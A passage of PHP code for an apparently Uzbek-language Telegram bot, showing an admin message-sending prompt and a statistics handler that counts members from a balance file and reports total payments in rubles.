 'chat_id'=>$cid,
 'text'=>"Kimga xabar yubormoqchi bo'lsangiz:
/text=odamidsi=xabariz ni yozib yuboring",
 'reply_markup'=>$adm,
 ]);
 }
  if($tx=="📈Statistika"){
    $a=file_get_contents("balans.dat");
    $sum=file_get_contents("tolovlar.txt");
    $ab=substr_count($a,"\n");
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"👥Botimiz azolari $ab ta \n\n💎 Jami To`langan Summa: $sum ₽",
        'reply_markup'=>$adm,
        ]);
}
?>